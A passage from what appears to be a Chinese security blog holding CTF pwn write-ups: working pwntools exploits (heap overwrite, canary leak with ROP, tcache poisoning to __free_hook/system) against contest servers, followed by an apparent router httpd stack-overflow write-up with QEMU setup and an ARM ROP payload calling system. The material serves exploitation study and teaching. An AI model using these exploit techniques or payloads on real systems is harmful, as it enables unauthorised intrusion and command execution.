class="keyword">if</span> ( !flag )</span><br><span class="line">    init2();<span class="comment">//仅第一便运行时，确定sbrk_now（sbrk堆开始的初始值）和sbrk_offset当前堆值</span></span><br><span class="line">  delta[<span class="number">2</span>] = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">/* delta 0为chunk长度  */</span></span><br><span class="line">  v3 = (_DWORD *)sbrk_now;</span><br><span class="line">  *(_QWORD *)delta = (<span class="type">unsigned</span> <span class="type">int</span>)(a1 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v3 != (_DWORD *)sbrk_offset )<span class="comment">//遍历最后一个外的所有堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v3 &amp;&amp; v3[<span class="number">1</span>] &gt;= (<span class="type">int</span>)delta[<span class="number">0</span>] )<span class="comment">//当堆块释放并且满足大小大于申请时可以重利用</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v3 = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)&amp;delta[<span class="number">1</span>] = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">2</span>] )<span class="comment">//有重利用地址时返回重利用地址</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)v3[<span class="number">2</span>];</span><br><span class="line">      v3[<span class="number">2</span>] = (_DWORD)v3;<span class="comment">//无重利用地址时为重利用地址赋值（正常情况下第一次调用只标记不重利用，第二次重利用）</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = (_DWORD *)((<span class="type">char</span> *)v3 + (<span class="type">int</span>)v3[<span class="number">1</span>]);<span class="comment">//下一个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)&amp;delta[<span class="number">1</span>] )<span class="comment">//申请后更新信息</span></span><br><span class="line">  &#123;</span><br><span class="line">    sbrk(delta[<span class="number">0</span>]);</span><br><span class="line">    *(_QWORD *)&amp;delta[<span class="number">1</span>] = sbrk_offset;</span><br><span class="line">    sbrk_offset += (<span class="type">int</span>)delta[<span class="number">0</span>];</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;delta[<span class="number">1</span>] + <span class="number">4LL</span>) = delta[<span class="number">0</span>];</span><br><span class="line">    **(_DWORD **)&amp;delta[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;delta[<span class="number">1</span>] + <span class="number">12LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据申请可以分析出堆块结构</p><p><img src="https://www.helloimg.com/i/2025/05/16/682611890629f.png" alt="image-20250515233451048.png"></p><h3 id="editit漏洞利用点"><a href="#editit漏洞利用点" class="headerlink" title="editit漏洞利用点"></a>editit漏洞利用点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 editit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf[8]; // [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read(0, buf, 4uLL);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( *(&amp;::buf + v1) )</span><br><span class="line">    read(0, *(&amp;::buf + v1), 0x80uLL);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以越界写</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>首先申请3个堆块，并释放第二个，此时堆块状态为</p><p><a href="https://www.helloimg.com/i/2025/05/16/6826121e6194b.png"><img src="https://www.helloimg.com/i/2025/05/16/6826121e6194b.png" alt="image-20250515234247756.png"></a></p><p>然后如果正常情况下new会先将蓝色的0变为len处地址，然后向下开开辟新堆块4，第二次new才会重利用蓝色堆块。但我们可以通过直接写绿色堆块进行覆盖到蓝色，然后将magic地址写入蓝色</p><p><a href="https://www.helloimg.com/i/2025/05/16/6826118a54f46.png"><img src="https://www.helloimg.com/i/2025/05/16/6826118a54f46.png" alt="image-20250515234720437.png"></a></p><p>此时当执行到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v3[2] )//有重利用地址时返回重利用地址</span><br><span class="line">  return (int)v3[2];</span><br></pre></td></tr></table></figure><p>时，就会认为这个是可以进行重利用，并将magic地址作为堆块返回，那么下一次修改的位置就为magic</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./malloc_special&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def new_buf():</span><br><span class="line">    io.sendline(b&quot;add&quot;)</span><br><span class="line">    </span><br><span class="line">def free_buf(index):</span><br><span class="line">    io.sendline(b&quot;delete&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">def print_buf(index):</span><br><span class="line">    io.sendline(b&quot;showit&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">def write_buf(index,context):</span><br><span class="line">    io.sendline(b&quot;editit&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.send(context)</span><br><span class="line">    </span><br><span class="line">def backdoor():</span><br><span class="line">    io.sendline(b&quot;cat_flags&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*28+p64(0x0000002c00000001)+p32(0x06020F0)+p32(0x06020F0)</span><br><span class="line">magic_num = p32(305419896)</span><br><span class="line"></span><br><span class="line">new_buf()</span><br><span class="line">new_buf()</span><br><span class="line">new_buf()</span><br><span class="line"></span><br><span class="line">free_buf(1)</span><br><span class="line">write_buf(0,payload)</span><br><span class="line"></span><br><span class="line">new_buf()</span><br><span class="line">write_buf(2,magic_num)</span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ISCC"><a href="#ISCC" class="headerlink" title="ISCC"></a>ISCC</h2><p>格式化字符串偏移泄露canary，然后就是64位rop链构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from code import interact</span><br><span class="line">from pwn import *</span><br><span class="line">libc = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.log_level= &quot;debug&quot;</span><br><span class="line">io = remote(&quot;101.200.155.151&quot;,12400)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&quot;AAAA%23$X&quot;)</span><br><span class="line">io.recv()</span><br><span class="line">p = io.recv()</span><br><span class="line">canary = int(p[4:12],16)</span><br><span class="line">io.send(b&quot;a&quot;*64+p32(canary)+b&quot;a&quot;*12+p32(libc.plt[&#x27;puts&#x27;])+p32(libc.symbols[&#x27;main&#x27;])+p32(libc.got[&#x27;puts&#x27;]))</span><br><span class="line">puts_real = io.recvuntil(&#x27;\xf7&#x27;)</span><br><span class="line">puts_real = u32(puts_real)</span><br><span class="line">base_addr = puts_real - 0x072880</span><br><span class="line">system_real = base_addr + 0x047cd0</span><br><span class="line">sh_real = base_addr + 0x1b90d5</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&quot;AAAA%23$X&quot;)</span><br><span class="line">io.recv()</span><br><span class="line">p = io.recv()</span><br><span class="line">canary = int(p[4:12],16)</span><br><span class="line">io.send(b&quot;a&quot;*64+p32(canary)+b&quot;a&quot;*12+p32(system_real)+p32(libc.symbols[&#x27;main&#x27;])+p32(sh_real))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本体思路是先通过最开始的UAF进行修改magic为255，来泄露carnary然后进行栈溢出执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">io = remote(&quot;101.200.155.151&quot;,12200)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004014c3 # pop rdi ; ret</span><br><span class="line">ret = 0x40101a </span><br><span class="line">libc = ELF(&quot;./pwn&quot;)</span><br><span class="line">#io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;size:\n&#x27;)</span><br><span class="line">io.sendline(b&quot;100&quot;)</span><br><span class="line">io.recvuntil(b&quot;flag:\n&quot;)</span><br><span class="line">io.sendline(b&quot;flag&quot;)</span><br><span class="line"></span><br><span class="line">io.recvline(b&quot;welcome to ISCC&quot;)</span><br><span class="line">io.send(b&quot;a&quot;*24+b&quot;b&quot;)</span><br><span class="line">io.recvuntil(b&quot;b&quot;)</span><br><span class="line">carnary = u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">io.recvuntil(b&quot;meet you&quot;)</span><br><span class="line">print(carnary)</span><br><span class="line">io.sendline(b&quot;a&quot;*24+p64(carnary)+b&quot;v&quot;*8+p64(pop_rdi)+p64(libc.got[&#x27;puts&#x27;])+p64(libc.plt[&#x27;puts&#x27;])+p64(libc.symbols[&#x27;main&#x27;]))</span><br><span class="line">io.recvuntil(b&quot;too!\n&quot;)</span><br><span class="line">puts_real = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(puts_real))</span><br><span class="line"></span><br><span class="line">base_addr = puts_real - 0x084420</span><br><span class="line">system_real = base_addr + 0x052290</span><br><span class="line">sh_real = base_addr + 0x1b45bd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvline(b&quot;welcome to ISCC&quot;)</span><br><span class="line">io.send(b&quot;a&quot;*24+b&quot;b&quot;)</span><br><span class="line">io.recvuntil(b&quot;b&quot;)</span><br><span class="line">carnary = u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">io.recvuntil(b&quot;meet you&quot;)</span><br><span class="line">print(carnary)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(b&quot;a&quot;*24+p64(carnary)+b&quot;v&quot;*8+p64(pop_rdi)+p64(sh_real)+p64(ret)+p64(system_real)+p64(libc.symbols[&#x27;main&#x27;]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>堆溢出+uaf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = remote(&#x27;101.200.155.151&#x27;, 12700)</span><br><span class="line">#io=process(&#x27;./attachment-13&#x27;)</span><br><span class="line">elf = ELF(&#x27;./attachment-13&#x27;)</span><br><span class="line">libc=ELF(&#x27;./attachment-13.6&#x27;) #2.27</span><br><span class="line">def create(idx,size):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;1&quot;)</span><br><span class="line">io.sendlineafter(b&quot;coordinate:\n&quot;, str(idx)) </span><br><span class="line">io.sendlineafter(b&quot;required:\n&quot;, str(size))</span><br><span class="line">def show(idx):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;4&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;cosmic truth:\n&#x27;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;2&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;cleanse:\n&#x27;,str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">io.sendlineafter(b&quot;your choice:\n&quot;, b&quot;3&quot;)</span><br><span class="line">    io.sendlineafter(b&#x27;inscription:\n&#x27;,str(idx))</span><br><span class="line">    io.sendlineafter(b&quot;length:\n&quot;, str(size))</span><br><span class="line">    io.sendafter(b&quot;truth:\n&quot;, content)</span><br><span class="line">create(0,0x410)</span><br><span class="line">create(1,0x20) </span><br><span class="line">create(2,0x20)</span><br><span class="line">create(3,0x20)</span><br><span class="line">create(4,0x20)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">leak_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak_addr - 0x3ebca0</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">edit(3,0x8,p64(free_hook))</span><br><span class="line">create(2,0x20)</span><br><span class="line">create(3,0x20)</span><br><span class="line">edit(3,0x8,p64(system)) </span><br><span class="line">edit(4,0x8,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">free(4)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-1873622</title>
      <link href="/2025/05/09/cve-1873622/"/>
      <url>/2025/05/09/cve-1873622/</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="设置主机网络环境"><a href="#设置主机网络环境" class="headerlink" title="设置主机网络环境"></a>设置主机网络环境</h3><p>本地桥接br0，开放tap0接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link add name br0 type bridge</span><br><span class="line"># 将 eth9(自己选择设备) 加入网桥</span><br><span class="line">sudo ip link set eth9 master br0</span><br><span class="line"># 设置自己的ip</span><br><span class="line">sudo ip addr add 192.168.117.1/24 dev br0</span><br><span class="line">sudo ip link set br0 up</span><br><span class="line"></span><br><span class="line"># 创建 TAP 设备（例如 tap0）</span><br><span class="line">sudo ip tuntap add name tap0 mode tap</span><br><span class="line"># 启动 TAP 设备</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line"># 将 TAP 设备添加到网桥 br0（假设 br0 已存在且配置正确）</span><br><span class="line">sudo ip link set tap0 master br0</span><br><span class="line">sudo ifconfig tap0 192.168.117.100/24 </span><br></pre></td></tr></table></figure><h3 id="调整httpd文件"><a href="#调整httpd文件" class="headerlink" title="调整httpd文件"></a>调整httpd文件</h3><p>由于不能模拟部分环境，需要将httpd的部分判断修改后才能正常运行</p><p>*开头表示修改完成后的行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* .text:0002E248                 MOV             R3, #1</span><br><span class="line">.text:0002E24C                 CMP             R3, #0</span><br><span class="line">.text:0002E250                 BGT             loc_2E260</span><br><span class="line">.text:0002E254                 MOV             R0, #1  ; seconds</span><br><span class="line">.text:0002E258                 BL              sleep</span><br><span class="line">.text:0002E25C                 B               loc_2E23C</span><br><span class="line">.text:0002E260 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0002E260</span><br><span class="line">.text:0002E260 loc_2E260                               ; CODE XREF: sub_2E158+F8↑j</span><br><span class="line">*  .text:0002E260                 MOV             R0, #1  ; seconds</span><br><span class="line">.text:0002E264                 BL              sleep</span><br><span class="line">.text:0002E268                 BL              ConnectCfm</span><br><span class="line">.text:0002E26C                 MOV             R3, #1</span><br></pre></td></tr></table></figure><h3 id="设置qemu环境"><a href="#设置qemu环境" class="headerlink" title="设置qemu环境"></a>设置qemu环境</h3><p>主机下载虚拟机镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure><p>主机启动虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm \ </span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic   -audio none</span><br></pre></td></tr></table></figure><p>虚拟机设置eth0网络环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.117.76/24 up</span><br></pre></td></tr></table></figure><p>主机上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.117.76:/root</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line"></span><br><span class="line">brctl addbr br0    #添加br0虚拟网卡</span><br><span class="line">ifconfig br0 192.168.117.76/24 up</span><br><span class="line"></span><br><span class="line"># 修复页面显示问题</span><br><span class="line">cp -rf ./webroot_ro/* ./webroot/</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space    #关闭地址随机化</span><br><span class="line">./bin/httpd</span><br></pre></td></tr></table></figure><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>将poc.py中的url替换成你的url，检查libc地址是否一致后可执行</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点"></a>溢出点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  v1 = (_BYTE *)sscanf(v15 + 1, &quot;%[^:]:%s&quot;, nptr, v6);</span><br><span class="line">  if ( v1 == (_BYTE *)2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *v15 == &#x27;-&#x27; )</span><br><span class="line">      v20 = 0xC - atoi(nptr);</span><br><span class="line">    else</span><br><span class="line">      v20 = atoi(nptr) + 0xC;</span><br><span class="line">    sprintf(v8, &quot;%d&quot;, v20);</span><br><span class="line">    strcpy(v7, v6);</span><br><span class="line">    SetValue(&quot;sys.timezone&quot;, v8);</span><br><span class="line">    v1 = (_BYTE *)SetValue(&quot;sys.timenextzone&quot;, v7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%[^:]:%s&quot;</span><br></pre></td></tr></table></figure><p>并不存在过滤，所以可以捕获过长的字符串进行溢出，但需要考虑要使得v1 ！&#x3D;2，避免多余的strcpy，因为处理不当会出现构造的rop出现错误，所以要构造以下格式的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;a&quot;*(offset+1) + payload +&quot;: \n&quot;</span><br></pre></td></tr></table></figure><p>offset+1是为了满足sscanf从v15+1读取的原因</p><h3 id="执行gadget构造"><a href="#执行gadget构造" class="headerlink" title="执行gadget构造"></a>执行gadget构造</h3><p>定位system，想办法控制到R0，寻找符合条件的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary httpd --only r3|ret</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+= p32(pop_r3_pc) + p32(system) + p32(mov_r0_SP_ldr_r3) + cmd</span><br></pre></td></tr></table></figure><p>执行pop_r3_pc时，将system的地址设置为r3，将mov_r0_SP_ldr_r3的地址放入pc寄存器，也就是运行mov_r0_SP_ldr_r3处代码。</p><p>执行mov_r0_SP_ldr_r3，将sp（cmd命令地址）放入r0，跳转运行r3地址处，也就是刚刚放入r3的system</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>成功打印<code>success_pwn_it</code></p><h2 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="设置主机网络环境-1"><a href="#设置主机网络环境-1" class="headerlink" title="设置主机网络环境"></a>设置主机网络环境</h3><p>本地桥接br0，开放tap0接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link add name br0 type bridge</span><br><span class="line"># 将 eth9(自己选择设备) 加入网桥</span><br><span class="line">sudo ip link set eth9 master br0</span><br><span class="line"># 设置自己的ip</span><br><span class="line">sudo ip addr add 192.168.117.1/24 dev br0</span><br><span class="line">sudo ip link set br0 up</span><br><span class="line"></span><br><span class="line"># 创建 TAP 设备（例如 tap0）</span><br><span class="line">sudo ip tuntap add name tap0 mode tap</span><br><span class="line"># 启动 TAP 设备</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line"># 将 TAP 设备添加到网桥 br0（假设 br0 已存在且配置正确）</span><br><span class="line">sudo ip link set tap0 master br0</span><br><span class="line">sudo ifconfig tap0 192.168.117.100/24 </span><br></pre></td></tr></table></figure><h3 id="调整httpd文件-1"><a href="#调整httpd文件-1" class="headerlink" title="调整httpd文件"></a>调整httpd文件</h3><p>由于不能模拟部分环境，需要将httpd的部分判断修改后才能正常运行</p><p>*开头表示修改完成后的行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* .text:0002E248                 MOV             R3, #1</span><br><span class="line">.text:0002E24C                 CMP             R3, #0</span><br><span class="line">.text:0002E250                 BGT             loc_2E260</span><br><span class="line">.text:0002E254                 MOV             R0, #1  ; seconds</span><br><span class="line">.text:0002E258                 BL              sleep</span><br><span class="line">.text:0002E25C                 B               loc_2E23C</span><br><span class="line">.text:0002E260 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0002E260</span><br><span class="line">.text:0002E260 loc_2E260                               ; CODE XREF: sub_2E158+F8↑j</span><br><span class="line">*  .text:0002E260                 MOV             R0, #1  ; seconds</span><br><span class="line">.text:0002E264                 BL              sleep</span><br><span class="line">.text:0002E268                 BL              ConnectCfm</span><br><span class="line">.text:0002E26C                 MOV             R3, #1</span><br></pre></td></tr></table></figure><h3 id="设置qemu环境-1"><a href="#设置qemu环境-1" class="headerlink" title="设置qemu环境"></a>设置qemu环境</h3><p>主机下载虚拟机镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure><p>主机启动虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm \ </span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel 